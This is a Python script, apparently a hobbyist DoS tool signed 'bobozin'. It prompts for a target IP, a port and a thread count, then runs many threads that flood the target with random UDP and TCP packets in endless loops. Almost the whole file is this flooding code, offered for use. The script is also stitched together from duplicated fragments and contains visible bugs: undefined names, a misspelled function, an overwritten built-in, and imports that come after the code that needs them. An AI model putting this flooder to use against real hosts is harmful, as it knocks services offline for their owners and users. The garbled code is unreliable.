#!/usr/bin/env python3
#B0bV2 Criador por bobozin
import os
os.system("clear")
print("██████╗  ██████╗ ██████╗ ")
print("██╔══██╗██╔═████╗██╔══██╗")
print("██████╔╝██║██╔██║██████╔╝")
print("██╔══██╗████╔╝██║██╔══██╗")
print("██████╔╝╚██████╔╝██████╔╝")
print("╚═════╝  ╚═════╝ ╚═════╝ ")

ip = input("IP: ")
port = int(input("PORTAL: "))
choice = 'y'
times = 500
threads = int(input("TH: "))
os.system("clear")
import socket, threading
data = bytes.fromhex("AA AA AA AA")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((ip, port))
for x in range(times):
    s.send(data)
s.close()
import socket, threading, time, sys
def news():
    try:
        bytes = random._urandom(1024)
        data = bytes.fromhex("AA AA AA AA")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < Timeout:
            PORT = random.randit(22,55500)
            sock.sendto(data*bytes*random.randint(5,22),(ip, port))
            for x in range(times):
            	sock.send(data)
            	sock.send(bytes)
    except:
    	print("")
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = news)
		th.start()
import threading, socket, random, argparse
def run():
	data = random._urandom(1024)
	i = random.choice(("[?]","[?]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
		except:
			s.close()

def run2():
	data = random._urandom(16)
	i = random.choice(("[?]","[?]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
		
#!/usr/bin/env python3
import time, socket, random, threading, sys, os, signal
choice = 'y'
times = 500
threads = 15
print("")
def run():
	data = random._urandom(30)
	i = random.choice(("[?]","[?]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
		except:
			s.close()

def run2():
	data = random._urandom(16)
	i = random.choice(("[?]","[?]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP = SOCK_STREAM
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

def new():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = run)
			th.start()
		else:
			th = threading.Thread(target = run2)
			th.start()
th1 = threading.Thread(target = new)
th1.start()

def whereuwere():
    print("BOBOZIN (UDP) & (TCP)")
    print("Put 1 for UDP and 2 for TCP")
    whereman = str(input(" 1 or 2 >:("))
    if whereman == '1':
        run()
    else:
        run2()

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet BOBOZINBOBBOBO")
	sys.exit(130)

def exit_gracefully(signum, frame):
    # restore the original signal handler
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" sair <3 ?:"))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("AA AA AA AA")
        byebye()

    # restore the gracefully exit handler
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    # store SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
